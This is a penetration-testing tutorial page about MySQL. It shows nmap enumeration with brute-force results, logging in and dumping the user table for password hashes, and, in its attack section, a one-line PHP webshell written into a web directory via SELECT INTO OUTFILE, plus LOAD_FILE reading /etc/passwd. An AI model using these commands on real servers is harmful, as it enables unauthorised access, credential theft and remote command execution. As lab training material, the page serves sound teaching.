---
title: MySQL
description: MySQL Database
categories: [Services]
tags: [Services, Database, MySQL]
weight: 2
---
## Service Info
- Name: MySQL
- Purpose: Database
- Listening port: **3306 TCP**
- OS: Unix-Like, Windows

MySQL is an open-source **Structured Query Language (SQL)** database developed and supported by Oracle. It is part of the LAMP stack (Linux, Apache, MySQL, PHP) for web applications. It is also often used to store sensitive information such as user account credentials and personally identifiable information (PII), although passwords are often hashed instead of stored in plaintext.

The best practice for hosting databases is to only allow local machine or internal network access, but misconfigurations can allow them to be accessed through the internet.

MariaDB is a community-developed, commercially-supported fork of MySQL. It maintains full compatibility with MySQL, and its clients and servers can be used interchanably.

SQL injection is a vast topic in of itself that a dedicated article will be create for. We will not be discussing it in this article.

## Service Enumeration
Nmap scan with all MySQL scripts:
```shell-session
╭─brian@rx-93-nu ~
╰─$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute:
|   Accounts:
|     root:<empty> - Valid credentials
|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0
|_mysql-databases: ERROR: Script execution failed (use -d to debug)
|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)
| mysql-empty-password:
|_  root account has empty password
| mysql-enum:
|   Valid usernames:
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-info:
|   Protocol: 10
|   Version: 8.0.26-0ubuntu0.20.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YTSgMfqvx\x0F\x7F\x16\&\x1EAeK>0
|_  Auth Plugin Name: caching_sha2_password
|_mysql-users: ERROR: Script execution failed (use -d to debug)
|_mysql-variables: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds
```

## Database Engine Interaction
We can connect to a SQL database via the `mysql` utility, which allow us to query the database interactively.
```shell-session
╭─brian@rx-93-nu ~
╰─$ mysql -u root -pP4SSw0rd -h 10.129.14.128

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 150165
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

We can use `select version()` to print out the version of MySQL running on the target.
```shell-session
MySQL [(none)]> select version();
+-------------------------+
| version()               |
+-------------------------+
| 8.0.27-0ubuntu0.20.04.1 |
+-------------------------+
1 row in set (0.001 sec)
```

### Default Databases
MySQL usually comes with several database preinstalled by default. Three of them contains information useful to attackers:
- **mysql**: the main system database, contains database user information such as username, password hashes, and permissions inside the `user` table.
    - The **mysql** must have `SELECT` privilege on the `user` table in order to read it, which is only granted to high-privileged user like `root`.
- **System schema (sys)**: contains tables, information and metadata necessary for management
- **Information schema (information_schema)**: Also contains metadata, mainly retreived from the **sys** database


### Database Enumeration
`show databases` command will show all databases available on this MySQL server:
```shell-session
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.006 sec)
```
To see the tables inside a database, we can first select the database and then use `show tables`.
```shell-session
MySQL [(none)]> use mysql;
MySQL [mysql]> show tables;
+------------------------------------------------------+
| Tables_in_mysql                                      |
+------------------------------------------------------+
| columns_priv                                         |
| component                                            |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| password_history                                     |
...SNIP...
| user                                                 |
+------------------------------------------------------+
37 rows in set (0.002 sec)
```
If we are interested in the contents of a table, we can dump it using `SELECT * FROM <TABLE_NAME>`.
```sql
SELECT * FROM user
```
We can also see all columns fro a table with:
```sql
show columns FROM user
```
Then we can specify the column names we are interested in:
```sql
SELECT username,password FROM user
```

## MySQL Attacks

### Arbitrary File Read/Write
MySQL supports the reading and writing of system files. The writing of system files is particularly useful when a web server that supports a backend scripting language (PHP, ASP.NET, etc.) is running. This combination allows an attacker who has access to the MySQL server to write a webshell into a web directory, which would give him command execution capabilities on the target.

However, two factors are used to control system file access through MySQL:
- Only users with `FILE` privilege is allowed to read and write system files.
- The `secure_file_priv` environment variable limits the scope of system file access. It can be set to one of three of the following values:
    - **Empty**: no affect, users with `FILE` privilege has the same file access permissions as the account running the MySQL service.
    - **Name of a directory**: Server limits reading/writing to that particular directory only.
    - **NULL**: Servers disables all system file access.

We can query the `secure_file_priv` variable:
```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```
To see if our current user has file access privilege, we can query the `USER_PRIVILEGES` table under information_schema:
```shell-session
mysql> SELECT * FROM information_schema.USER_PRIVILEGES
    -> WHERE PRIVILEGE_TYPE = 'FILE';
+---------------------+---------------+----------------+--------------+
| GRANTEE             | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE |
+---------------------+---------------+----------------+--------------+
| 'root'@'localhost'  | def           | FILE           | YES          |
+---------------------+---------------+----------------+--------------+
2 rows in set (0.001 sec)
```
- If the query returns a row with our current username, we have the privilege.
- If the query returns an empty set, then we lack the privilege.

If we have `FILE` prvilege and the `secure_file_priv` environment variable is configured correctly, we can write to a file using `SELECT ... INTO OUTFILE`.
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

To read from a file, we can use the `LOAD_FILE` command:
```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

